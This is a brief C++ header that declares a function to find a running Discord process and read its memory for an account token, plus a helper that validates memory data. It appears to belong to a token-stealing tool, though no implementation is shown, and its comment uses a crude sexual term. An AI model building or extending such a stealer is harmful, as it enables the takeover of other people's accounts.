#pragma once
#include <windows.h>
#include <string>

//Finds a discord process and then rapes its memory to get a token.
std::string getDiscordToken();

std::string validate_data(HANDLE process, void* address);
